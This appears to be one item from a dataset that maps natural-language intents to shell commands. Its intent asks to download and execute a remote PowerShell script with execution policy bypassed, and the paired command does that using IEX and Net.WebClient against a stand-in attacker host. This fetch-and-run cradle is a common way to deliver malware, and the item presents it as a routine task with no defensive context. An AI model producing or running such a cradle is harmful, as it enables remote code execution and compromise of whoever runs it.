# Natural language intent:
# Download and execute a PowerShell script from a remote URL with Bypass execution policy.

powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://example-hacker.com')"
